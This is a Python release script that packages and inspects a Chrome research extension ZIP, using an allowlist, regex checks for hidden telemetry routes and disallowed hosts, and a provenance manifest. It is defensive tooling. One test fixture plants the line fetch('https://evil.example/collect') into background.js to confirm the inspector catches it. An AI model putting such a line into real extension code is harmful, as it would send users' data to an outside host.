#!/usr/bin/env python3
"""Allowlist builder and inspector for the SEASON 2026 workshop extension ZIP.

Does not zip the working tree in place. Copies only declared files into a clean
staging directory, rejects symlinks, undeclared files and local settings, then
writes a deterministic ZIP plus a sidecar provenance manifest.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import shutil
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_SOURCE = REPO_ROOT / "web_extension_chrome"
POLICY_PATH = REPO_ROOT / "release-policy" / "season-2026-workshop.json"
LOCK_PATH = REPO_ROOT / "requirements-release.lock"
LOCK_DIGEST_PATH = REPO_ROOT / "requirements-release.lock.sha256"

ZIP_FILENAME = "investigating-search-interface-season-2026-v0.2.1.zip"
ZIP_DATE = (2026, 8, 20, 0, 0, 0)
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

EXPECTED_NAME = "Investigating Search Interface"
EXPECTED_VERSION = "0.2.1"
EXPECTED_VERSION_NAME = "Alpha build 0.2.1"
EXPECTED_BUILD_ID = "0.2.1-season-2026-1"
EXPECTED_NOTICE = "season-2026-v2"
EXPECTED_API = "https://investigating-search-interface.onrender.com"
EXPECTED_PRIVACY = "https://investigating-search-interface.onrender.com/privacy/"
EXPECTED_PROJECT = "https://investigating-search-interface.onrender.com/"
EXPECTED_HOST_PERMISSION = "https://investigating-search-interface.onrender.com/*"
EXPECTED_GOOGLE_MATCHES = (
    "https://www.google.com/search*",
    "https://www.google.co.uk/search*",
    "https://www.google.ie/search*",
    "https://www.google.at/search*",
    "https://www.google.be/search*",
    "https://www.google.ca/search*",
    "https://www.google.ch/search*",
    "https://www.google.com.au/search*",
    "https://www.google.de/search*",
    "https://www.google.dk/search*",
    "https://www.google.es/search*",
    "https://www.google.fi/search*",
    "https://www.google.fr/search*",
    "https://www.google.it/search*",
    "https://www.google.nl/search*",
    "https://www.google.no/search*",
    "https://www.google.pl/search*",
    "https://www.google.pt/search*",
    "https://www.google.se/search*",
)
EXPECTED_ICONS = {
    "16": "icon-isi-16.png",
    "48": "icon-isi-48.png",
    "128": "icon-isi-128.png",
}

ALLOWLIST = (
    "manifest.json",
    "config.js",
    "background.js",
    "content.js",
    "content.css",
    "popup.html",
    "popup.js",
    "popup.css",
    "lib/acknowledgement.js",
    "lib/request_lifecycle.js",
    "icon-isi-16.png",
    "icon-isi-48.png",
    "icon-isi-128.png",
)
ALLOWLIST_SET = set(ALLOWLIST)
BINARY_SUFFIXES = {".png"}
LOCAL_SETTINGS_NAMES = {"local_settings.js", "local_settings.example.js"}
TEXT_SUFFIXES = {".js", ".json", ".html", ".css", ".md", ".txt"}

# Topic exclusions are a workshop user setting, not a prohibited research path.
EXCLUSION_TOKENS = ("isi_topics_exclude", "topicsExclude", "topics_exclude")

PROHIBITED = (
    (re.compile(r"\bpostReport\b"), "hidden_research_route"),
    (re.compile(r"\bpostResponse\b"), "hidden_research_route"),
    (re.compile(r"\blogEvent\b"), "hidden_research_route"),
    (re.compile(r"\bgetInstallationId\b"), "installation_id_key"),
    (re.compile(r"\bisi_installation_id\b"), "installation_id_key"),
    (re.compile(r"\bisi_consent_given\b"), "legacy_consent_key"),
    (re.compile(r"\bisi_log_events\b"), "telemetry_key"),
    (re.compile(r"localhost", re.IGNORECASE), "localhost_host"),
    (re.compile(r"127\.0\.0\.1"), "localhost_host"),
    (re.compile(r"\*\.onrender\.com"), "wildcard_host"),
    (re.compile(r"type:\s*['\"]health['\"]"), "unexpected_network_path"),
    (re.compile(r"query:\s*['\"]['\"]"), "empty_lookup"),
    (re.compile(r"/data/event/"), "hidden_research_route"),
    (re.compile(r"/data/notrelevantreport/"), "hidden_research_route"),
    (re.compile(r"/data/response/"), "hidden_research_route"),
)

URL_RE = re.compile(r"https?://[^\s\"'`<>]+")
ALLOWED_URL_PREFIXES = (
    EXPECTED_API,
    EXPECTED_PROJECT,
) + tuple(match.rstrip("*") for match in EXPECTED_GOOGLE_MATCHES)

FIXTURE_CASES = (
    "undeclared_file",
    "symlink",
    "localhost_host",
    "wildcard_host",
    "hidden_research_route",
    "installation_id_key",
    "unexpected_network_path",
)


def sha256_bytes(data):
    return hashlib.sha256(data).hexdigest()


def sha256_file(path):
    return sha256_bytes(Path(path).read_bytes())


def inspect_text(text):
    """Return issue labels for a text blob. Exclusion preference keys are allowed."""
    if not text:
        return []
    if text.strip() in EXCLUSION_TOKENS:
        return []
    issues = []
    for pattern, label in PROHIBITED:
        if pattern.search(text):
            issues.append(label)
    for match in URL_RE.finditer(text):
        url = match.group(0).rstrip(".,);]}>")
        if not any(url.startswith(prefix) for prefix in ALLOWED_URL_PREFIXES):
            issues.append("unexpected_network_path")
    return issues


def _rel(path, root):
    return path.relative_to(root).as_posix()


def _validate_manifest(data):
    issues = []
    if data.get("name") != EXPECTED_NAME:
        issues.append(f"manifest name {data.get('name')!r} != {EXPECTED_NAME!r}")
    if data.get("version") != EXPECTED_VERSION:
        issues.append(f"manifest version {data.get('version')!r} != {EXPECTED_VERSION!r}")
    if data.get("version_name") != EXPECTED_VERSION_NAME:
        issues.append(f"manifest version_name {data.get('version_name')!r} != {EXPECTED_VERSION_NAME!r}")
    hosts = data.get("host_permissions") or []
    if hosts != [EXPECTED_HOST_PERMISSION]:
        issues.append(f"host_permissions {hosts!r} != [{EXPECTED_HOST_PERMISSION!r}]")
    if any("localhost" in str(item).lower() or "127.0.0.1" in str(item) for item in hosts):
        issues.append("localhost_host")
    if any("*" in str(item).replace(EXPECTED_HOST_PERMISSION, "") for item in hosts):
        if any("*.onrender.com" in str(item) for item in hosts):
            issues.append("wildcard_host")
    permissions = data.get("permissions") or []
    if permissions != ["storage"]:
        issues.append(f"permissions {permissions!r} != ['storage']")
    scripts = data.get("content_scripts") or []
    matches = scripts[0].get("matches") if scripts else []
    if list(matches) != list(EXPECTED_GOOGLE_MATCHES):
        issues.append(f"google matches {matches!r} != {list(EXPECTED_GOOGLE_MATCHES)!r}")
    icons = data.get("icons") or {}
    if icons != EXPECTED_ICONS:
        issues.append(f"icons {icons!r} != {EXPECTED_ICONS!r}")
    return issues


def _validate_config(text):
    issues = []
    required = (
        (EXPECTED_API, "API origin"),
        (EXPECTED_PRIVACY, "privacy URL"),
        (EXPECTED_PROJECT, "project URL"),
        (EXPECTED_BUILD_ID, "build ID"),
        (EXPECTED_VERSION, "extension version"),
        (EXPECTED_NOTICE, "notice version"),
        ("MAX_PROMPTS: 1", "max prompts"),
    )
    for needle, label in required:
        if needle not in text:
            issues.append(f"config missing {label}: {needle}")
    return issues


def _check_js_syntax(path):
    try:
        proc = subprocess.run(
            ["node", "--check", str(path)],
            capture_output=True,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return ["javascript_syntax: node is not available"]
    if proc.returncode != 0:
        detail = (proc.stderr or proc.stdout or "").strip().splitlines()
        msg = detail[0] if detail else f"exit {proc.returncode}"
        return [f"javascript_syntax: {path.name}: {msg}"]
    return []


def inspect_distribution(source_dir):
    """Inspect a directory as if it were the files that would be packaged."""
    root = Path(source_dir)
    issues = []
    if not root.is_dir():
        return [f"missing directory: {root}"]

    seen = set()
    for path in sorted(root.rglob("*")):
        if path.is_dir() and not path.is_symlink():
            continue
        rel = _rel(path, root)
        if path.name in LOCAL_SETTINGS_NAMES:
            issues.append(f"local_settings: {rel}")
        if path.is_symlink():
            issues.append(f"symlink: {rel}")
            continue
        if rel not in ALLOWLIST_SET:
            issues.append(f"undeclared_file: {rel}")
            continue
        seen.add(rel)
        if path.suffix.lower() in BINARY_SUFFIXES:
            blob = path.read_bytes()
            if not blob.startswith(PNG_MAGIC):
                issues.append(f"icon is not PNG: {rel}")
            continue
        try:
            text = path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            issues.append(f"non-utf8 text file: {rel}")
            continue
        for label in inspect_text(text):
            issues.append(f"{rel}: {label}")
        if path.suffix == ".js":
            for label in _check_js_syntax(path):
                issues.append(f"{rel}: {label}")
        if path.name == "manifest.json":
            try:
                data = json.loads(text)
            except json.JSONDecodeError as exc:
                issues.append(f"manifest.json: invalid JSON ({exc})")
            else:
                issues.extend(_validate_manifest(data))
        if path.name == "config.js":
            issues.extend(_validate_config(text))

    for required in ALLOWLIST:
        if required not in seen and not (root / required).is_symlink():
            issues.append(f"missing_allowlisted_file: {required}")
    return issues


def _copy_allowlist(source_dir, dest_dir):
    source = Path(source_dir)
    dest = Path(dest_dir)
    dest.mkdir(parents=True, exist_ok=True)
    for rel in ALLOWLIST:
        src = source / rel
        if src.is_symlink():
            raise RuntimeError(f"allowlisted path is a symlink: {rel}")
        if not src.is_file():
            raise FileNotFoundError(f"missing allowlisted file: {src}")
        target = dest / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(src, target)


def _write_clean_fixture(dest_dir):
    _copy_allowlist(DEFAULT_SOURCE, dest_dir)


def inspect_fixture(case):
    """Plant one contamination class into a clean allowlist tree and inspect it."""
    if case not in FIXTURE_CASES:
        raise ValueError(f"unknown contamination case: {case}")
    with tempfile.TemporaryDirectory(prefix="isi-pkg-fixture-") as tmp:
        root = Path(tmp)
        _write_clean_fixture(root)
        _plant_contamination(root, case)
        return inspect_distribution(root)


def _plant_contamination(root, case):
    manifest_path = root / "manifest.json"
    background_path = root / "background.js"
    if case == "undeclared_file":
        (root / "notes.txt").write_text("not in the workshop allowlist\n", encoding="utf-8")
        return
    if case == "symlink":
        real = root / "real-content.js"
        real.write_bytes((root / "content.js").read_bytes())
        (root / "content.js").unlink()
        (root / "content.js").symlink_to(real.name)
        return
    if case == "localhost_host":
        data = json.loads(manifest_path.read_text(encoding="utf-8"))
        data["host_permissions"] = ["http://localhost:8000/*"]
        manifest_path.write_text(json.dumps(data, indent=4) + "\n", encoding="utf-8")
        return
    if case == "wildcard_host":
        data = json.loads(manifest_path.read_text(encoding="utf-8"))
        data["host_permissions"] = ["https://*.onrender.com/*"]
        manifest_path.write_text(json.dumps(data, indent=4) + "\n", encoding="utf-8")
        return
    if case == "hidden_research_route":
        background_path.write_text(
            background_path.read_text(encoding="utf-8") + "\nasync function postReport() {}\n",
            encoding="utf-8",
        )
        return
    if case == "installation_id_key":
        popup = root / "popup.js"
        popup.write_text(
            popup.read_text(encoding="utf-8") + "\nconst k = 'isi_installation_id';\n",
            encoding="utf-8",
        )
        return
    if case == "unexpected_network_path":
        background_path.write_text(
            background_path.read_text(encoding="utf-8") + "\nfetch('https://evil.example/collect');\n",
            encoding="utf-8",
        )
        return
    raise ValueError(f"unhandled contamination case: {case}")


def _zip_bytes(staging_dir):
    staging = Path(staging_dir)
    buffer = tempfile.SpooledTemporaryFile()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for rel in ALLOWLIST:
            data = (staging / rel).read_bytes()
            info = zipfile.ZipInfo(rel, date_time=ZIP_DATE)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.create_system = 3
            info.external_attr = 0o644 << 16
            zf.writestr(info, data)
    buffer.seek(0)
    return buffer.read()


def _git_identity():
    def run(args):
        proc = subprocess.run(
            args,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        if proc.returncode != 0:
            return None
        return (proc.stdout or "").strip() or None

    return {
        "head": run(["git", "rev-parse", "HEAD"]),
        "branch": run(["git", "rev-parse", "--abbrev-ref", "HEAD"]),
        "tree": run(["git", "rev-parse", "HEAD^{tree}"]),
        "dirty": bool(run(["git", "status", "--porcelain"])),
    }


def _policy():
    if not POLICY_PATH.is_file():
        return {}
    return json.loads(POLICY_PATH.read_text(encoding="utf-8"))


def _lock_sha():
    if not LOCK_PATH.is_file():
        return None
    actual = sha256_file(LOCK_PATH)
    expected = None
    if LOCK_DIGEST_PATH.is_file():
        expected = LOCK_DIGEST_PATH.read_text(encoding="utf-8").split()[0].strip().lower()
    return {"actual": actual, "expected": expected, "matches": expected == actual}


def write_provenance(staging_dir, zip_path, zip_sha, output_path):
    staging = Path(staging_dir)
    inventory = []
    for rel in ALLOWLIST:
        path = staging / rel
        inventory.append({
            "path": rel,
            "sha256": sha256_file(path),
            "bytes": path.stat().st_size,
        })
    policy = _policy()
    payload = {
        "artefact": ZIP_FILENAME,
        "zip_sha256": zip_sha,
        "zip_path": str(zip_path),
        "source_commit": _git_identity(),
        "build_id": EXPECTED_BUILD_ID,
        "extension_version": EXPECTED_VERSION,
        "notice_version": EXPECTED_NOTICE,
        "api_origin": EXPECTED_API,
        "privacy_url": EXPECTED_PRIVACY,
        "file_inventory": inventory,
        "allowlist": list(ALLOWLIST),
        "model": policy.get("model"),
        "dependency_lock": _lock_sha(),
        "release_policy": str(POLICY_PATH.relative_to(REPO_ROOT)),
        "release_policy_sha256": sha256_file(POLICY_PATH) if POLICY_PATH.is_file() else None,
        "effective_configuration": policy.get("config"),
        "content_index_fingerprint": {
            "status": "not_run",
            "note": "Live content and index fingerprints are recorded from a production-parity apply, not invented at package time.",
        },
    }
    output_path = Path(output_path)
    output_path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    return payload


def build_zip(source_dir=None, output_dir=None):
    """Copy the allowlist into a clean directory, inspect it, and write a deterministic ZIP."""
    source = Path(source_dir or DEFAULT_SOURCE)
    if output_dir is None:
        out = Path(tempfile.mkdtemp(prefix="isi-workshop-pkg-"))
    else:
        out = Path(output_dir)
        forbidden = {source.resolve(), DEFAULT_SOURCE.resolve(), REPO_ROOT.resolve()}
        if out.resolve() in forbidden or source.resolve() in out.resolve().parents:
            raise RuntimeError(f"refusing to replace {out}")
        if out.exists():
            shutil.rmtree(out)
        out.mkdir(parents=True, exist_ok=True)

    staging = out / "staging"
    if staging.exists():
        shutil.rmtree(staging)
    _copy_allowlist(source, staging)
    issues = inspect_distribution(staging)
    if issues:
        raise RuntimeError("packaged tree failed inspection:\n" + "\n".join(issues))

    payload = _zip_bytes(staging)
    zip_path = out / ZIP_FILENAME
    zip_path.write_bytes(payload)
    zip_sha = sha256_bytes(payload)
    provenance_path = out / (ZIP_FILENAME.replace(".zip", ".provenance.json"))
    provenance = write_provenance(staging, zip_path, zip_sha, provenance_path)
    return {
        "sha256": zip_sha,
        "filename": ZIP_FILENAME,
        "path": str(zip_path),
        "provenance_path": str(provenance_path),
        "output_dir": str(out),
        "inventory": provenance["file_inventory"],
    }


def verify_double_build(source_dir=None, output_dir=None):
    first_dir = Path(output_dir) if output_dir else Path(tempfile.mkdtemp(prefix="isi-pkg-a-"))
    second_dir = Path(tempfile.mkdtemp(prefix="isi-pkg-b-"))
    first = build_zip(source_dir=source_dir, output_dir=first_dir)
    second = build_zip(source_dir=source_dir, output_dir=second_dir)
    if first["sha256"] != second["sha256"]:
        raise RuntimeError(
            f"double build hash mismatch: {first['sha256']} != {second['sha256']}"
        )
    return first


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--source", type=Path, default=DEFAULT_SOURCE)
    parser.add_argument(
        "--out-dir",
        type=Path,
        default=REPO_ROOT / "release-output" / "season-2026",
    )
    parser.add_argument(
        "--inspect-source",
        action="store_true",
        help="Inspect the working source tree (expected to fail while extras remain).",
    )
    parser.add_argument("--verify-double-build", action="store_true")
    parser.add_argument("--json-out", type=Path)
    args = parser.parse_args(argv)

    source_issues = inspect_distribution(args.source) if args.inspect_source else None
    built = None
    if args.verify_double_build:
        built = verify_double_build(source_dir=args.source, output_dir=args.out_dir)
    else:
        built = build_zip(source_dir=args.source, output_dir=args.out_dir)

    record = {
        "filename": built["filename"],
        "sha256": built["sha256"],
        "path": built["path"],
        "provenance_path": built["provenance_path"],
        "source_issues": source_issues,
        "source_issue_count": None if source_issues is None else len(source_issues),
    }
    if args.json_out:
        Path(args.json_out).write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")
    print(f"filename={built['filename']}")
    print(f"sha256={built['sha256']}")
    print(f"path={built['path']}")
    if source_issues is not None:
        print(f"source_issue_count={len(source_issues)}")
        for item in source_issues:
            print(f"source_issue: {item}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
